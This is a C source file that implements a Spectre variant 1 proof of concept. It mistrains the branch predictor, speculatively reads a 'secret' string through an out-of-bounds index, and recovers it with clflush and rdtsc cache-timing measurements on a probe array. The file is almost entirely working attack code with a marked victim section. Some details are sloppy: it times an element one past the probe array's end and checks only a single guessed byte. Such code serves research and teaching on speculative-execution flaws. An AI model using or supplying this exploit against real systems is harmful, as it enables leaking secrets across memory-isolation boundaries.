#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <x86intrin.h>
#include <stdint.h>


unsigned int arr1_size = 16;
uint8_t  arr1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}; //used to index arr2
uint8_t arr2[256 * 512] ;   // used to guess the ASCII value in secret
char * secret = "This is the sensitive data" ;


static __inline__ unsigned Load(uint8_t *addr){
    volatile unsigned val;
    asm __volatile__(
                  " movl (%1), %%eax \n"
		   : "=a"(val)
		   : "c"(addr)
		   : );
                  //%edx is modified by rdtsc and %esi by our code
    return (val);
}


static __inline__ unsigned LoadAndMeasure(uint8_t *addr){
    volatile unsigned val;
    asm __volatile__(
		  " mfence \n"
		  " rdtsc \n"
		  " lfence \n"
		  " movl %%eax, %%esi \n"
                  " movl (%1), %%eax \n"
		  " lfence \n"
		  " rdtsc \n"
		  " subl %%esi, %%eax"
		   : "=a"(val)
		   : "c"(addr)
		   : "%edx","%esi");
                  //%edx is modified by rdtsc and %esi by our code
    return (val);
    //We return only the lower 32 bits due to relatively low resolution
}



int main(int argc, char ** argv){

  size_t malicious_index = (size_t) (secret - (char*)arr1 ); 

  for (int j = 0 ; j  < 256*512; ++j) arr2[j] = 1;

  int hit_time = LoadAndMeasure(&arr2[256*512]); 
  printf("hit time in this machine is %d\n", hit_time);

  _mm_clflush(&arr2[256*512]);
  int miss_time = LoadAndMeasure(&arr2[256*512]);
  printf("misstime in this machine is %d\n", miss_time);
  
  __sync_synchronize();

  size_t training_x ; 
  size_t x;
  int measured_time;
  int threshold = hit_time + 20;  


  for (int i = 0; i < 256; i++){
    _mm_clflush(&arr2[i * 512]); 
    asm __volatile__(" mfence \n");
  } 

  training_x = 50 % arr1_size;

  for ( int t = 29;  t >= 0; t--) {
    _mm_clflush( & arr1_size);    
    asm __volatile__(" mfence \n"); 

    x = ((t % 6) - 1) & ~0xFFFF; 
    x = (x | (x >> 16));        // Set x=-1 if j&6=0, else x=0 
    x = training_x ^ (x & (malicious_index ^ training_x)); // x = tranning_x for x = 0, else malicious
    /********** Victim **************/
    if (x < arr1_size){
      asm __volatile__(" nop \n  nop \n  nop \n  nop \n  nop \n");
      Load(&arr2[arr1[x] * 512]);
    }
    /********** Victim **************/
  }

  int test = LoadAndMeasure(secret);
  printf("load secret time is %d \n", test);
  test = LoadAndMeasure( & arr2[84 * 512]);
  printf("load array2 84 time is %d \n", test);

  return 0;

}
